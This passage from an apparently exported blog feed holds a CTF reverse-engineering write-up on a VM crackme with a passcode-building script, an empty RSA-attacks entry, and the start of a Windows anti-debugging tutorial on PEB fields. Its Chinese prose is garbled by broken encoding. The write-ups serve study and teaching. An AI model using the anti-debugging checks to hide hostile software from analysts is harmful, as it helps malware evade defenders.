number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>   <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>opcodeå¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">opcode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ‰¾åˆ°opcodeåœ¨byte_603F00æ•°ç»„ä¸­çš„ä¸‹æ ‡v2ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> opcode<span class="token punctuation">:</span>    v2<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>ida_chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment">#v2 = ['$', '8', 'C', 't', '0', 'E', 'u', '#', ';']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†åŠ¨æ€è°ƒè¯•æ‰¾åˆ°opcodeå¯¹åº”çš„å‡½æ•°åŠä½œç”¨ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""é€šè¿‡åˆ†æå¾—çŸ¥å¯¹åº”å˜é‡çš„å«ä¹‰a1      ==&gt; heap_addra1+16   ==&gt; Passcodea1+664  ==&gt; next = Passcode[i+1]a1+665  ==&gt; byte  -- tempa1+288  ==&gt; DWORD -- str_indexa1+292  ==&gt; DWORD -- str_lena1+280  ==&gt; DWORD -- 0x110a1+8    ==&gt; DWORD -- str --&gt; "PaF0!&amp;Prv}H{ojDQ#7v="0::$ ==&gt; sub_400DC1: temp = str[str_index]1::8 ==&gt; sub_400E7A: str[str_index] = temp2::C ==&gt; sub_400F3A: temp = temp + next - 333::t ==&gt; sub_401064: temp = temp - next + 33  if !*(a1 + 665): ++temp 4::0 ==&gt; sub_4011C9: ++str_index5::E ==&gt; sub_40133D: check()6::u ==&gt; sub_4012F3:  --str_index  7::# ==&gt; sub_4014B9: {      if str_index &lt; str_len and next - 48 &lt; 41        str[str_index] = Passcode[str_index + next - 48] - 49}8::; ==&gt; sub_400CF1: {     str_index += next    if next - 16 &lt;= 89:         str[str_index] = Passcode[str_index + next - 48] - 49}"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæˆ‘ä»¬å†å›åˆ°sub_40113Dè¿™ä¸ªå‡½æ•°ï¼Œå³å¯¹byte_603F00äº¤å‰å¼•ç”¨è·Ÿè¸ªåˆ°sub_40113Då‡½æ•°</p><ul><li>è¿™é‡Œï¼Œå°±å¯ä»¥æœ‰æƒ³æ³•äº†ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¾“å‡º<code>Binggo</code>ï¼Œè€Œè¿™é‡Œè¾“å‡ºstrå­—ç¬¦ä¸²ï¼Œå¹¶ä¸”åœ¨ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼š<code>#</code>ï¼Œ<code>ï¼›</code>å¯¹åº”çš„å‡½æ•°æ˜¯å¯ä»¥ä¿®æ”¹strå­—ç¬¦ä¸²çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ä¸ªPasscodeè¾“å…¥ï¼ŒæŠŠstrå­—ç¬¦ä¸²ä¿®æ”¹ä¸º<code>Binggo</code>å³å¯ï¼Œä½†æ˜¯è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œstrå­—ç¬¦ä¸²é•¿åº¦ä¸º20æ¯”<code>Binggo</code>é•¿åº¦å¤§ï¼Œæ‰€ä»¥æœ€åè¿˜æœ‰æ„é€ ä¸€ä¸ª<code>\x00</code>å»æˆªæ–­ã€‚</li></ul><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/6.png"></p><p>æ„é€ Passcode</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""ä¸¾ä¸€ä¸ªä¾‹å­ï¼š$t/80$ ==&gt; temp = str[0] =  'P't ==&gt; temp = temp - next +33 = 'P' - next + 33ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©tempä¸º'B'ï¼Œæ‰€ä»¥ next = '/'/8 ==&gt; str[0] = temp = 'B'0 ==&gt; str_index++ ==&gt; str_index = 1ï¼Œå¤„ç†ä¸‹ä¸€ä¸ªå­—ç¬¦"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆè„šæœ¬å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">"PaF0!&amp;Prv}H{ojDQ#7v="</span>t <span class="token operator">=</span> <span class="token string">"Binggo"</span>s <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> <span class="token string">"$"</span>    temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">33</span>    <span class="token keyword">if</span> temp <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">:</span> <span class="token comment">#å¿…é¡»ä¸ºå¯è§å­—ç¬¦</span>        temp <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">33</span>        s <span class="token operator">+=</span> <span class="token string">"C"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        s <span class="token operator">+=</span> <span class="token string">'t'</span>    s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"80"</span>s <span class="token operator">+=</span> <span class="token string">"#"</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">48</span> <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"1"</span> <span class="token comment">#æ„é€ \x00æˆªæ–­</span>s <span class="token operator">+=</span> <span class="token string">"uuuuuuEs"</span> <span class="token comment">#é€šè¿‡uæŠŠstr_indexç§»åŠ¨åˆ°stræœ€å¼€å§‹çš„ä½ç½®ï¼Œå¹¶é€šè¿‡Eè¿›å…¥check()å‡½æ•°ï¼Œsåˆ™ç»•è¿‡*(a1 + 664) == 's'æ£€æŸ¥</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token comment">#s = "$t/80$C)80$CI80$CX80$Cg80$Cj80#J1uuuuuuEs"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/05/ddctf2018-hei-he-po-jie/7.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-RE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-RE </tag>
            
            <tag> VMé€†å‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSAå¸¸è§æ”»å‡»</title>
      <link href="/2023/04/05/rsa-chang-jian-gong-ji/"/>
      <url>/2023/04/05/rsa-chang-jian-gong-ji/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntiBebug</title>
      <link href="/2023/04/04/antibebug/"/>
      <url>/2023/04/04/antibebug/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><h4 id="TEBã€PEBç»“æ„ç®€ä»‹"><a href="#TEBã€PEBç»“æ„ç®€ä»‹" class="headerlink" title="TEBã€PEBç»“æ„ç®€ä»‹"></a>TEBã€PEBç»“æ„ç®€ä»‹</h4><p>TEBï¼šçº¿ç¨‹ç¯å¢ƒå—ã€‚è¿›ç¨‹ä¸­æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„TEBã€‚ç³»ç»Ÿåœ¨TEBä¸­ä¿å­˜é¢‘ç¹ä½¿ç”¨çš„çº¿ç¨‹ç›¸å…³çš„æ•°æ®ï¼Œ<strong>ä½äºç”¨æˆ·åœ°å€ç©ºé—´</strong>ã€‚åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œå¯é€šè¿‡CPUçš„FSå¯„å­˜å™¨æ¥è®¿é—®TEBæ‰€åœ¨æ®µï¼Œ<strong>ä¸€èˆ¬å­˜å‚¨åœ¨[FS:0]å¤„</strong>ã€‚</p><p>PEBï¼šè¿›ç¨‹ç¯å¢ƒå—ã€‚å­˜æ”¾è¿›ç¨‹ä¿¡æ¯ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„PEBä¿¡æ¯ï¼Œä½äºç”¨æˆ·åœ°å€ç©ºé—´ã€‚</p><p>TEBä¸­æˆ‘ä»¬å…³å¿ƒçš„æˆå‘˜ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">0x000</span> NtTib   <span class="token operator">:</span>_NT_TIB<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">0x30</span> ProcessEnvironmentBlock       <span class="token operator">:</span>Ptr32_PEB<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>1ï¼‰NtTibç»“æ„ä½“(TIBå³çº¿ç¨‹ä¿¡æ¯å—)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token class-name">_NT_TIB</span><span class="token punctuation">{</span> <span class="token keyword">struct</span><span class="token class-name">_EXCEPTION_REGISTRATION_RECORD</span> <span class="token operator">*</span>ExceptionList<span class="token punctuation">;</span> PVOID StackBase<span class="token punctuation">;</span> PVOID StackLimit<span class="token punctuation">;</span>  PVOID SubSystemTib<span class="token punctuation">;</span>  <span class="token keyword">union</span> <span class="token punctuation">{</span>PVOID FiberData<span class="token punctuation">;</span> DWORD Version<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>  PVOID ArbitraryUserPointer<span class="token punctuation">;</span>  <span class="token keyword">struct</span><span class="token class-name">_NT_TIB</span> <span class="token operator">*</span>Self<span class="token punctuation">;</span><span class="token punctuation">}</span> NT_TIB<span class="token punctuation">;</span><span class="token keyword">typedef</span> NT_TIB <span class="token operator">*</span>PNT_TIB<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>0x00ï¼šExceptionListæŒ‡å‘_EXCEPTION_REGISTRATION_RECORDç»“æ„ä½“(ç”¨äºSEH)ç»„æˆçš„é“¾è¡¨;</li><li>0x18ï¼šselfæŒ‡å‘ NtTibè‡ªå·±ï¼Œè€Œ NtTibæ˜¯TEBçš„ç¬¬ä¸€ä¸ªæˆå‘˜ï¼Œæ‰€ä»¥selfç­‰äºæŒ‡å‘TEBç»“æ„ä½“ï¼›</li></ul><p>åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨**Ntdll.NtCurrentTeb()**APIå¾—åˆ°TEBç»“æ„ä½“çš„åœ°å€ï¼Œå³è¿”å›FS:[0x18]çš„å€¼ï¼Œselfå°±ä½äºFS:[0x18]åœ°å€å¤„ã€‚</p><p>2ï¼‰ProcessEnvironmentBlock(å³PEB)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">002</span>BeingDebugged <span class="token punctuation">;</span><span class="token function">Uchar</span><span class="token punctuation">(</span>å¯ç”¨äºåè°ƒè¯•æŠ€æœ¯<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">008</span>ImageBaseAddress  <span class="token punctuation">;</span>Ptr32 Void<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">00</span>cLdr  <span class="token punctuation">;</span>Ptr32 <span class="token function">_PEB_LDR_DATA</span><span class="token punctuation">(</span>å¯ç”¨äºåè°ƒè¯•æŠ€æœ¯<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">018</span>ProcessHeap  <span class="token punctuation">;</span>Ptr32 <span class="token function">Void</span><span class="token punctuation">(</span>å¯ç”¨äºåè°ƒè¯•æŠ€æœ¯<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">+</span><span class="token number">068</span>NtGlobalFlag   <span class="token punctuation">;</span><span class="token function">uint4B</span><span class="token punctuation">(</span>å¯ç”¨äºåè°ƒè¯•æŠ€æœ¯<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>+002ï¼šBeingDebuggedæ ‡è¯†å½“å‰è¿›ç¨‹æ˜¯å¦å¤„äºè°ƒè¯•çŠ¶æ€ï¼Œæ˜¯åˆ™ä¸º1ï¼Œå¦åˆ™ä¸º0ã€‚å¯ä»¥ä½¿ç”¨**IsDebuggerPresent()**APIè·å–è¯¥å€¼;</li><li>+008ï¼šImageBaseAddressè®°å½•å½“å‰è¿›ç¨‹çš„ImageBaseï¼Œå¯ä»¥ä½¿ç”¨**GetModuleHandle()**APIç”¨æ¥è·å–ImageBase;</li><li>+00cï¼šLdrç»“æ„ä½“ï¼Œè°ƒè¯•è¿›ç¨‹æ—¶ï¼Œå…¶å †å†…å­˜åŒºåŸŸä¸­ä¼šå‡ºç°ä¸€äº›ç‰¹æ®Šæ ‡è¯†,è¡¨åå®ƒæ­£å¤„äºè¢«è°ƒè¯•çŠ¶æ€ï¼Œæœªä½¿ç”¨çš„å †å†…å­˜åŒºåŸŸå…¨éƒ¨å¡«å……ç€0xEEFEEEFEï¼Œåˆ©ç”¨è¿™ä¸€ç‰¹å¾å¯åˆ¤æ–­æ˜¯å¦å¤„äºè¢«è°ƒè¯•çŠ¶æ€ã€‚Ldr æŒ‡å‘ PEB_LDR_DATAç»“æ„ä½“æŒ‡é’ˆï¼ŒPEB_LDR_DATAæ°å¥½æ˜¯åœ¨å †ä¸­åˆ›å»ºçš„ã€‚<strong>æ£€æµ‹PEB_LDR_DATAæ˜¯å¦æ˜¯0xEEFEEEFEå³å¯åˆ¤æ–­æ˜¯å¦å¤„äºè¢«è°ƒè¯•</strong>ï¼›</li><li>+018ï¼šProcessHeapç»“æ„ä½“é‡Œé¢ç”±ä¸¤ä¸ªé‡è¦æˆå‘˜ï¼›</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">+</span><span class="token number">0xC</span>  Flags<span class="token operator">+</span><span class="token number">0x10</span> ForceFlagsç¨‹åºæ­£å¸¸è¿è¡Œæ—¶ï¼šâ€‹ HEAP<span class="token punctuation">.</span>Flags<span class="token operator">=</span><span class="token number">0x2</span>â€‹ HEAP<span class="token punctuation">.</span>ForceFlags<span class="token operator">=</span><span class="token number">0</span>è°ƒè¯•æ—¶ä¼šå‘ç”Ÿå˜åŒ–ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>+068ï¼šNtGlobalFlagï¼Œ<strong>è°ƒè¯•è¿›ç¨‹æ—¶ï¼ŒNtGlobalFlagä¼šè¢«ç½®ä¸º0x70</strong>ï¼›</li></ul><p>å¾—åˆ°å¦‚ä¸‹åœ°å€å…³ç³»ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">FS<span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span 